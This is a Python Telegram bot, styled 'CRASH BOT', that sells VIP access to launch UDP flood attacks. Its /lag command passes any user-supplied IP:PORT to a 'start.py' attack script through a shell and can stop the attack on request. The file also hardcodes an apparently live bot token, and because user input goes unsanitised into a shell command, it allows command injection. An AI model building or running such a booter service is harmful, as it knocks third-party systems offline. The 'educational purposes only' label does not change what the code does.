import telebot
import subprocess  
import os
import signal
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


TOKEN = "7204428522:AAGPUki5YMvWlRRGj6a9zGjTEpAVVhG_mLA"
bot = telebot.TeleBot(TOKEN)


ALLOWED_USERS = [8068341198,1480248962]  


vip_users = {}


active_attacks = {}

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id
        days_left = vip_users.get(user_id, 0)

        text = (
            f"🤖 *WELCOME TO THE CRASH BOT!*\n\n"
            f"✅ *YOUR STATUS:* {'VIP' if days_left > 0 else 'REGULAR USER'}\n"
            f"⏳ *DAYS REMAINING:* {days_left if days_left > 0 else 'N/A'}\n\n"
            f"📌 *HOW TO LAUNCH AN ATTACK:*\n"
            f"/lag <IP:PORT>\n\n"
            f"⚠️ *NOTE:* THIS BOT IS FOR EDUCATIONAL PURPOSES ONLY"
        )

        markup = InlineKeyboardMarkup()
        creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
        markup.add(creator_button)

        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    try:
        user_id = message.from_user.id
        if user_id not in ALLOWED_USERS:
            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
            return

        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ CORRECT USAGE: /ADDVIP <USER_ID> <DAYS>")
            return

        target_user_id = int(command_parts[1])
        

        try:
            days = int(command_parts[2])
        except ValueError:
            bot.reply_to(message, "⚠️ INVALID NUMBER OF DAYS. PLEASE ENTER A VALID INTEGER.")
            return

        vip_users[target_user_id] = days
        bot.reply_to(message, f"✅ ADDED {days} DAY(S) FOR USER {target_user_id}.")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

@bot.message_handler(commands=['lag'])
def handle_lag_command(message):
    try:
        user_id = message.from_user.id

        if vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 YOU MUST BE A VIP TO USE THIS COMMAND!")
            return

        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "⚠️ CORRECT USAGE: /lag <IP:PORT>", parse_mode="Markdown")
            return

        ip_port = command_parts[1]


        if ":" not in ip_port:
            bot.reply_to(message, "❌ INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
            return

        ip, port = ip_port.split(":")
        
        if not ip or not port.isdigit():
            bot.reply_to(message, "❌ INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
            return

        attack_type = "UDP"  
        threads = "1"
        duration = "900"

        command = f'python3 start.py {attack_type} {ip}:{port} {threads} {duration}'
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)

        if user_id not in active_attacks:
            active_attacks[user_id] = {}

        active_attacks[user_id][ip_port] = process

        response = (
            f"✅ *ATTACK LAUNCHED SUCCESSFULLY!*\n\n"
            f"📍 *TARGET:* {ip}:{port}\n"
            f"⚙️ *TYPE:* {attack_type}\n"
            f"🧵 *THREADS:* {threads}\n"
            f"⏳ *DURATION:* {duration}ms\n\n"
            f"🔴 *PRESS THE BUTTON BELOW TO STOP THE ATTACK.*"
        )

        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{ip_port}")
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
def stop_attack(call):
    try:
        user_id = call.from_user.id
        ip_port = call.data.split("_")[2]

        if user_id not in active_attacks or ip_port not in active_attacks[user_id]:
            bot.answer_callback_query(call.id, "NO ACTIVE ATTACK FOUND FOR THIS TARGET!")
            return

        process = active_attacks[user_id][ip_port]
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)

        del active_attacks[user_id][ip_port]
        if not active_attacks[user_id]:
            del active_attacks[user_id]

        bot.answer_callback_query(call.id, "ATTACK STOPPED SUCCESSFULLY!")
        bot.send_message(call.message.chat.id, f"🛑 *ATTACK ON {ip_port} HAS BEEN STOPPED.*", parse_mode="Markdown")
    except Exception as e:
        bot.answer_callback_query(call.id, f"AN ERROR OCCURRED: {str(e)}")
        bot.send_message(call.message.chat.id, f"AN ERROR OCCURRED: {str(e)}")

print("BOT IS RUNNING...")
bot.polling()
